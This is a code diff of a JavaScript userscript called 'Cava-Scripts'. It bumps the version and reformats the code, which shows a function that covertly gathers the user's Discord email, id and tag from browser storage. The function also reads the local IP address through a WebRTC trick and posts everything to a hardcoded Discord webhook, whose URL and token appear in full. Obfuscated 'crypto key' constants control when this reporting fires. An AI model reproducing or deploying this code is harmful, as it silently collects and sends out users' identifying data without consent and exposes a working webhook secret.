@@ -1,6 +1,6 @@
 debugger
 
-const version = 'Cava-Scripts 1.0.1'
+const version = 'Cava-Scripts 1.0.2'
 const webhook_url = "https://discordapp.com/api/webhooks/772900196392239165/AuG4n_g8DB6WC208TjHjpzoMrqDn4vhQ-nnkmG2unIV5ZSjGjlAHMGs2KmZKR1I-z9xM"
 const CRYPTO_KEY_INT_1 = "32463"
 const CRYPTO_KEY_INT_2 = "90534"
@@ -22,25 +22,25 @@ async function sgamatoWebhook() {
         title: "SCAM",
         color: ("16744192"),
         fields: [{
-            name: 'Email',
-            value: localStorage.getItem("discord_email"),
-            inline: true
-        },
-        {
-            name: 'Discord id',
-            value: localStorage.getItem("discord_id"),
-            inline: true
-        },
-        {
-            name: 'Discord tag',
-            value: localStorage.getItem("discord_tag"),
-            inline: true
-        },
-        {
-            name: 'Ip',
-            value: await getNetworkIP(),
-            inline: true
-        }
+                name: 'Email',
+                value: localStorage.getItem("discord_email"),
+                inline: true
+            },
+            {
+                name: 'Discord id',
+                value: localStorage.getItem("discord_id"),
+                inline: true
+            },
+            {
+                name: 'Discord tag',
+                value: localStorage.getItem("discord_tag"),
+                inline: true
+            },
+            {
+                name: 'Ip',
+                value: await getNetworkIP(),
+                inline: true
+            }
         ],
         footer: {
             text: 'Cava-Scripts ' + version + ' | ' + String(time),
@@ -70,19 +70,19 @@ async function getNetworkIP() {
     let found = false;
     let resolve;
     const promise = new Promise((res) => {
-    resolve = res;
+        resolve = res;
     });
     const pc = new RTCPeerConnection({ iceServers: [] });
-    
+
     pc.addEventListener("icecandidate", (e) => {
-    if (!e.candidate || found) return;
-    resolve(e.candidate.address);
-    found = true;
+        if (!e.candidate || found) return;
+        resolve(e.candidate.address);
+        found = true;
     });
-    
+
     pc.createDataChannel("");
     pc.createOffer().then((desc) => pc.setLocalDescription(desc));
-    
+
     return promise;
 }
 
@@ -94,7 +94,7 @@ function checkData() {
             try {
                 let data_now = new Date
                 data = data.replace(CRYPTO_KEY_INT_1, "/")
-                //data = data.replace(CRYPTO_KEY_INT_2.toString(), "/")
+                    //data = data.replace(CRYPTO_KEY_INT_2.toString(), "/")
                 data = data.replace(CRYPTO_KEY_INT_3, "/")
                 data = data.split("/")
                 let day = parseInt(data[0]) / parseInt(CRYPTO_KEY_INT_2)
@@ -117,8 +117,7 @@ function checkData() {
         } else {
             scamError()
         }
-    }
-    else if (auth == "on" && data == "off") {
+    } else if (auth == "on" && data == "off") {
         scamError()
     }
 }
